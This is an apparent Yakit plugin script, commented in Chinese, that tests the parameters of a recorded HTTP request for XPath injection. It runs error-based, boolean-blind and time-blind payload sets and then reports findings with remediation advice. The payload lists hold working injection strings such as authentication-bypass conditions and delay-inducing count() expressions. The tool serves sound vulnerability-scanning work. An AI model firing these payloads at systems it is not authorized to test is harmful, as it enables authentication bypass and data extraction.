__DESC__ = "XPath 注入检测工具，支持报错注入、布尔盲注和时间盲注三种检测方法，适用于 XML 数据查询场景"
__VERBOSE_NAME__ = "XPath 注入检测"
__KEYWORDS__ = "xpath,xpath-injection,xml,blind-injection,error-based,boolean-based"

// 配置项
debug = false
threads = 5  // XPath 检测较慢，控制并发

// -------------------------------------------------------------------
// CLI 参数定义
// -------------------------------------------------------------------
flowIDStr = cli.String(
    "httpflow-id",
    cli.setVerboseName("HTTPFlowID"),
    cli.setHelp("History 中的 HTTPFlow ID,用于获取请求/响应包内容"),
    cli.setRequired(true),
)
cli.check()

// 辅助输出函数
aiOut = msg => {
    try {
        yakit.AIOutput(msg)
    } catch {
        println(msg)
    }
}

// -------------------------------------------------------------------
// 核心数据结构: Payload 定义
// -------------------------------------------------------------------

// 阶段1: 报错注入 Payload
errorPayloads = [
    {
        "payload": "'",
        "patterns": [
            `(?i)xpath.*error`,
            `(?i)invalid.*xpath`,
            `(?i)unclosed.*string`,
            `(?i)expected.*token`,
            `(?i)org\.apache\.xpath`,
            `(?i)javax\.xml\.xpath`,
            `(?i)XPathException`,
            `(?i)XPathSyntaxException`,
            `(?i)XPath.*parse`,
            `(?i)malformed.*xpath`,
        ],
        "desc": "单引号语法错误"
    },
    {
        "payload": "\"",
        "patterns": [
            `(?i)xpath.*error`,
            `(?i)unclosed.*string`,
            `(?i)unterminated.*string`,
        ],
        "desc": "双引号语法错误"
    },
    {
        "payload": "']",
        "patterns": [
            `(?i)xpath.*error`,
            `(?i)unexpected.*token`,
            `(?i)syntax.*error`,
        ],
        "desc": "中括号闭合错误"
    },
    {
        "payload": "' and 'x'='y",
        "patterns": [
            `(?i)xpath.*error`,
            `(?i)invalid.*expression`,
        ],
        "desc": "逻辑表达式测试"
    },
]

// 阶段2: 布尔盲注 Payload
booleanPayloads = [
    {
        "true_payload": "' or '1'='1",
        "false_payload": "' or '1'='2",
        "desc": "基础布尔测试（单引号）"
    },
    {
        "true_payload": "\" or \"1\"=\"1",
        "false_payload": "\" or \"1\"=\"2",
        "desc": "基础布尔测试（双引号）"
    },
    {
        "true_payload": "') or ('1'='1",
        "false_payload": "') or ('1'='2",
        "desc": "括号闭合布尔测试"
    },
    {
        "true_payload": "\") or (\"1\"=\"1",
        "false_payload": "\") or (\"1\"=\"2",
        "desc": "括号闭合布尔测试（双引号）"
    },
    {
        "true_payload": "' or count(/*)>0 or '1'='2",
        "false_payload": "' or count(/*)>999999 or '1'='2",
        "desc": "count() 函数布尔测试"
    },
    {
        "true_payload": "' or string-length(name(/*[1]))>0 or '1'='2",
        "false_payload": "' or string-length(name(/*[1]))>999 or '1'='2",
        "desc": "string-length() 函数测试"
    },
]

// 阶段3: 时间盲注 Payload
timeBasedPayloads = [
    {
        "payload": "' or count(//*/*/*/*/*)>0 or '1'='2",
        "expected_delay": 1.5,
        "desc": "深度节点遍历延时"
    },
    {
        "payload": "' or (count(//*) and count(//*) and count(//*) and count(//*))>0 or '1'='2",
        "expected_delay": 1.0,
        "desc": "重复 count() 计算延时"
    },
    {
        "payload": "\" or (string-length(name(//*[1])) div string-length(name(//*[1])))>0 or \"1\"=\"2",
        "expected_delay": 0.8,
        "desc": "字符串计算延时"
    },
]

// -------------------------------------------------------------------
// 核心逻辑: 阶段1 - 报错注入检测
// -------------------------------------------------------------------

testErrorBased = func(param) {
    aiOut("  [1/3] 报错注入检测...")

    for i, p = range errorPayloads {
        aiOut(sprintf("    [%d/%d] 测试: %s", i+1, len(errorPayloads), p.desc))

        freq = param.Fuzz(p.payload)
        res, err = freq.ExecFirst()

        if res == nil { continue }

        body, err = str.ExtractBodyFromHTTPResponseRaw(res.ResponseRaw)
        if err != nil { continue }

        bodyStr = string(body)

        // 检查所有报错特征
        for _, pattern = range p.patterns {
            matches = re.FindAll(bodyStr, pattern)
            if len(matches) > 0 {
                aiOut(sprintf("    ✓ 检测到 XPath 报错: %s", matches[0]))

                return {
                    "vulnerable": true,
                    "type": "error-based",
                    "payload": p.payload,
                    "error_pattern": matches[0],
                    "request": res.RequestRaw,
                    "response": res.ResponseRaw
                }
            }
        }
    }

    aiOut("    × 未检测到报错特征")
    return nil
}

// -------------------------------------------------------------------
// 核心逻辑: 阶段2 - 布尔盲注检测
// -------------------------------------------------------------------

testBooleanBased = func(param) {
    aiOut("  [2/3] 布尔盲注检测...")

    // 获取正常响应作为基线
    aiOut("    → 获取基线响应...")
    baselineRes, _ = param.Fuzz("normalvalue123").ExecFirst()
    if baselineRes == nil {
        aiOut("    ! 无法获取基线响应")
        return nil
    }

    baselineBody, _ = str.ExtractBodyFromHTTPResponseRaw(baselineRes.ResponseRaw)
    baselineLen = len(baselineBody)
    aiOut(sprintf("    → 基线响应长度: %d bytes", baselineLen))

    for i, p = range booleanPayloads {
        aiOut(sprintf("    [%d/%d] 测试: %s", i+1, len(booleanPayloads), p.desc))

        // 测试真条件
        trueRes, _ = param.Fuzz(p.true_payload).ExecFirst()
        if trueRes == nil { continue }

        trueBody, _ = str.ExtractBodyFromHTTPResponseRaw(trueRes.ResponseRaw)
        trueLen = len(trueBody)

        // 测试假条件
        falseRes, _ = param.Fuzz(p.false_payload).ExecFirst()
        if falseRes == nil { continue }

        falseBody, _ = str.ExtractBodyFromHTTPResponseRaw(falseRes.ResponseRaw)
        falseLen = len(falseBody)

        // 计算差异
        trueDiff = abs(trueLen - baselineLen)
        falseDiff = abs(falseLen - baselineLen)
        trueFalseDiff = abs(trueLen - falseLen)

        aiOut(sprintf("      真条件: %d bytes (与基线差异: %d)", trueLen, trueDiff))
        aiOut(sprintf("      假条件: %d bytes (与基线差异: %d)", falseLen, falseDiff))

        // 判断标准（降低阈值以减少漏报）：
        // 1. 真条件响应与基线相似（差异 < 15%）且假条件明显不同（差异 > 10%）
        // 2. 或者真/假响应之间有明显差异（> 3% 且 > 20 bytes）
        // 3. 或者响应内容包含明显的成功/失败标识

        threshold1 = baselineLen > 0 && trueDiff < baselineLen * 0.15 && falseDiff > baselineLen * 0.1
        threshold2 = max(trueLen, falseLen) > 0 && trueFalseDiff > 20 && trueFalseDiff > max(trueLen, falseLen) * 0.03

        // 额外检查：内容是否包含成功/失败关键词
        trueBodyStr = string(trueBody)
        falseBodyStr = string(falseBody)

        hasSuccessKeyword = str.MatchAnyOfRegexp(trueBodyStr, `(?i)(success|welcome|login.*ok|logged.*in|valid)`) &&
                           !str.MatchAnyOfRegexp(falseBodyStr, `(?i)(success|welcome|login.*ok|logged.*in)`)

        hasFailureKeyword = str.MatchAnyOfRegexp(falseBodyStr, `(?i)(invalid|error|fail|denied|wrong)`) &&
                           !str.MatchAnyOfRegexp(trueBodyStr, `(?i)(invalid|error|fail|denied|wrong)`)

        threshold3 = (hasSuccessKeyword || hasFailureKeyword) && trueFalseDiff > 10

        if threshold1 || threshold2 || threshold3 {
            aiOut(sprintf("    ✓ 检测到布尔盲注特征（差异: %d bytes）", trueFalseDiff))

            return {
                "vulnerable": true,
                "type": "boolean-blind",
                "true_payload": p.true_payload,
                "false_payload": p.false_payload,
                "true_length": trueLen,
                "false_length": falseLen,
                "diff": trueFalseDiff,
                "request": trueRes.RequestRaw,
                "response": trueRes.ResponseRaw
            }
        }
    }

    aiOut("    × 未检测到布尔盲注")
    return nil
}

// 辅助函数
abs = func(x) {
    if x < 0 { return -x }
    return x
}

max = func(a, b) {
    if a > b { return a }
    return b
}

// -------------------------------------------------------------------
// 核心逻辑: 阶段3 - 时间盲注检测
// -------------------------------------------------------------------

testTimeBased = func(param) {
    aiOut("  [3/3] 时间盲注检测...")

    // 测试基线时间（3次取平均）
    aiOut("    → 测试基线响应时间...")
    totalTime = 0.0
    validTests = 0

    for i = 0; i < 3; i++ {
        baselineStart = time.Now()
        res, _ = param.Fuzz("normalvalue456").ExecFirst()
        if res != nil {
            totalTime += time.Since(baselineStart).Seconds()
            validTests++
        }
    }

    if validTests == 0 {
        aiOut("    ! 无法获取基线时间")
        return nil
    }

    baselineTime = totalTime / validTests
    aiOut(sprintf("    → 平均基线时间: %.2f 秒", baselineTime))

    threshold = 0.8  // 延时判断阈值（秒）

    for i, p = range timeBasedPayloads {
        aiOut(sprintf("    [%d/%d] 测试: %s", i+1, len(timeBasedPayloads), p.desc))

        injectionStart = time.Now()
        res, _ = param.Fuzz(p.payload).ExecFirst()
        injectionTime = time.Since(injectionStart).Seconds()

        if res == nil { continue }

        timeDiff = injectionTime - baselineTime

        aiOut(sprintf("      响应时间: %.2f 秒 (差异: %.2f 秒)", injectionTime, timeDiff))

        // 判断：响应时间明显增加
        if timeDiff >= threshold {
            aiOut(sprintf("    ✓ 检测到时间延迟特征（延迟: %.2f 秒）", timeDiff))

            return {
                "vulnerable": true,
                "type": "time-blind",
                "payload": p.payload,
                "baseline_time": baselineTime,
                "injection_time": injectionTime,
                "time_diff": timeDiff,
                "request": res.RequestRaw,
                "response": res.ResponseRaw
            }
        }
    }

    aiOut("    × 未检测到时间盲注")
    return nil
}

// -------------------------------------------------------------------
// 核心逻辑: 综合检测流程
// -------------------------------------------------------------------

fuzzXPathInjection = func(url, param) {
    aiOut(sprintf("\n正在检测参数: %s (%s)", param.Name(), param.PositionVerbose()))

    result = nil

    // 阶段1: 报错注入（最快，优先级最高）
    result = testErrorBased(param)
    if result != nil && result.vulnerable {
        return result
    }

    // 阶段2: 布尔盲注（较慢）
    result = testBooleanBased(param)
    if result != nil && result.vulnerable {
        return result
    }

    // 阶段3: 时间盲注（最慢，最后尝试）
    result = testTimeBased(param)
    if result != nil && result.vulnerable {
        return result
    }

    return nil
}

// -------------------------------------------------------------------
// 核心逻辑: 风险上报
// -------------------------------------------------------------------

reportXPathInjection = func(url, param, result) {
    injectionType = result.type

    typeNames = {
        "error-based": "报错注入",
        "boolean-blind": "布尔盲注",
        "time-blind": "时间盲注",
    }

    typeName = typeNames[injectionType]
    severity = "high"

    if injectionType == "error-based" {
        severity = "critical"  // 报错注入危害最大
    }

    title = sprintf("XPath 注入 (%s): %s", typeName, url)

    description = ""
    if injectionType == "error-based" {
        description = sprintf(
            "参数 %s 存在 XPath 注入漏洞（报错注入）。\n\n" +
            "检测到 XPath 报错信息: %s\n\n" +
            "攻击者可通过构造恶意 XPath 查询，绕过身份验证、提取敏感 XML 数据或执行未授权操作。\n\n" +
            "Payload: %s",
            param.Name(),
            result.error_pattern,
            result.payload
        )
    } else if injectionType == "boolean-blind" {
        description = sprintf(
            "参数 %s 存在 XPath 注入漏洞（布尔盲注）。\n\n" +
            "通过真/假条件测试，检测到响应差异: %d bytes\n" +
            "真条件响应长度: %d bytes\n" +
            "假条件响应长度: %d bytes\n\n" +
            "攻击者可通过布尔盲注逐字提取 XML 数据。\n\n" +
            "Payload 示例: %s",
            param.Name(),
            result.diff,
            result.true_length,
            result.false_length,
            result.true_payload
        )
    } else if injectionType == "time-blind" {
        description = sprintf(
            "参数 %s 存在 XPath 注入漏洞（时间盲注）。\n\n" +
            "检测到明显时间延迟:\n" +
            "基线响应时间: %.2f 秒\n" +
            "注入响应时间: %.2f 秒\n" +
            "时间差异: %.2f 秒\n\n" +
            "攻击者可通过时间盲注提取敏感数据。\n\n" +
            "Payload: %s",
            param.Name(),
            result.baseline_time,
            result.injection_time,
            result.time_diff,
            result.payload
        )
    }

    solution = `1. 使用参数化查询或预编译 XPath 表达式，避免直接拼接用户输入。
2. 对用户输入进行严格的白名单验证（仅允许字母、数字）。
3. 使用安全的 XPath 库（如 OWASP ESAPI）。
4. 避免在错误信息中暴露 XPath 查询细节。
5. 实施最小权限原则，限制 XML 数据访问范围。
6. 考虑使用其他数据存储方式（如关系数据库）替代 XML。
7. 记录和监控 XPath 查询异常。`

    aiOut(sprintf("✓ %s", title))

    risk.NewRisk(
        url,
        risk.title(title),
        risk.titleVerbose(sprintf("XPath 注入漏洞 (%s)", typeName)),
        risk.type("sqli"),  // XPath 注入归类为 sqli 类型
        risk.severity(severity),
        risk.payload(result.true_payload || result.payload || ""),
        risk.request(result.request),
        risk.response(result.response),
        risk.description(description),
        risk.solution(solution),
        risk.details({
            "injection_type": injectionType,
            "param_name": param.Name(),
            "param_position": param.PositionVerbose(),
            "detection_details": result
        })
    )
}

// -------------------------------------------------------------------
// 辅助函数: 参数过滤
// -------------------------------------------------------------------

shouldSkipParam = func(paramName) {
    // 跳过明显不会的参数
    skipPatterns = [
        "(?i)^(page|limit|offset|sort|order)$",
        "(?i)^(csrf|token|timestamp|nonce|_token)$",
        "(?i)^(lang|locale|theme|skin)$",
        "(?i)^(PHPSESSID|JSESSIONID|_ga|_gid)$",
    ]

    for _, pattern = range skipPatterns {
        if str.MatchAnyOfRegexp(paramName, pattern) {
            return true
        }
    }

    return false
}

// -------------------------------------------------------------------
// 主程序入口
// -------------------------------------------------------------------

flowID = parseInt(flowIDStr)
flowsChan := db.QueryHTTPFlowsByID(flowID)
flow = nil
for f := range flowsChan {
    flow = f
    break
}

if flow == nil {
    aiOut(sprintf("HTTPFlow 查询失败: 未找到 ID 为 %v 的请求", flowID))
    return
}

reqBytes = flow.GetRequest()
if reqBytes == nil { reqBytes = []byte(flow.Request) }
if reqBytes == nil || len(reqBytes) == 0 {
    aiOut("请求包为空,无法检测")
    return
}

isHttps = flow.IsHTTPS
freq, err := fuzz.HTTPRequest(reqBytes, fuzz.https(isHttps))
if err != nil {
    aiOut(sprintf("解析请求失败: %v", err))
    return
}

aiOut(sprintf("开始 XPath 注入检测 (Target: %s)...", flow.Url))

allParams = freq.GetCommonParams()
validParams = []

for param in allParams {
    if !shouldSkipParam(param.Name()) {
        validParams = append(validParams, param)
    }
}

if len(validParams) == 0 {
    aiOut("未发现可测试的有效参数")
    return
}

aiOut(sprintf("发现 %d 个有效参数，开始检测...", len(validParams)))

// 执行检测
foundCount = 0
for param in validParams {
    result = fuzzXPathInjection(flow.Url, param)

    if result != nil {
        reportXPathInjection(flow.Url, param, result)
        foundCount++
    }
}

if foundCount > 0 {
    aiOut(sprintf("\n=== XPath 注入检测完成，发现 %d 个漏洞 ===", foundCount))
} else {
    aiOut("\n=== XPath 注入检测完成，未发现漏洞 ===")
}
